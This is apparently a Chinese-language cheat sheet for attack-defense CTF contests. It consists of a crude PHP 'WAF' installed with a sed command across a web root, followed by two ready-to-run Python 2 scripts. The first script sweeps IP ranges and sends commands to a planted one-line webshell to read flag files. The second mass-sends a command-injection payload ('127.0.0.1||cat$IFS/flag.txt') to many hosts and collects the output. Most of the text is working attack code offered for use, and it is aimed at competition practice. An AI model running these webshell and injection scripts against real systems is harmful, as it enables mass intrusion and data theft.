# *waf*
```php
<?php
foreach($_REQUEST as $f){
    if(preg_match('/\S/m',$f))
    {
        die('flag{you_will_get_it}');
    }
}>
```

写在/tmp下，然后执行命令

    find /var/www/html -name "*.php"|xargs sed -i "s/<?php/<?php\nrequire('\/tmp\/waf.php');/g"

直接上awf

- tip

为什么要用require而不用include呢，首先require一定会执行并且遇到错误无法执行，include遇到错误直接跳过，其次require无论位置在哪都会首先执行，include则是遇到了才会执行，并且require是无条件包含，所以一定要用require防止包含失效被打穿

# 一句话木马脚本
`注意，以下所有脚本都是基于python2的，一定要学习Python2脚本`

`为什么要学习Python2呢，因为比赛环境kali是python2的`

`(看好是post还是get,如果是get自己修改下面命令注入的脚本)`
```python
import requests
import re
url="http://172.20."         #ip地址，如果是1.1.1.1,1.1.2.1请使用这个，然后根据网段自行修改自行修改
urll=".1/shell.php"          #如果不是index.php请自行修改为一句话木马的地址
payload={"shell":"system('cat /flag.txt');"}     #shell为一句话木马密码，请自行修改
for i in range(101,109):                   #从192.168.1.1-192.168.10.1,请根据靶机ip自行修改
    print(url+str(i)+urll)
    i=str(i)        #将i转换成字符型，不然无法拼接
    cc=url+i        #拼接
    cc=cc+urll      #拼接
    try:
        a=requests.post(url=cc,data=payload,timeout=1).text
        b=re.findall(r'[a-z0-9]{15,30}',a)      #正则匹配，表示匹配小写字母与数字组合长度为15-30位，根据flag位数自行修改，例如确定flag是20位那就直接r'[a-z0-9]{20}'
    except:
        b=''
    if len(b)>0:
        for j in b:
            f=open('1.txt','a+')    #输出至1.txt,可以自行修改
            f.write(url+i+".1 "+j+'\n')     #靶机ip第四位.1,根据情况自行修改
```
# 命令注入与文件包含通用脚本(根据漏洞自行修改)
```python
import requests
import re
url="172.20.10."
urll="/index.php?abc=127.0.0.1||cat$IFS/flag.txt"   #自行修改payload，本脚本展示get型命令注入与文件包含，看好题型如果是post自行修改
for i in range(1,10):
    i=str(i)
    try:
        a=requests.get(url=url+i+urll).text
        b=re.findall(r'flag{.*}', a)
    except:
        b=''
    if(len(b)>0):
        for j in b:
            f=open('1.txt','a+')
            f.write(url+i+" "+j+'\n')
```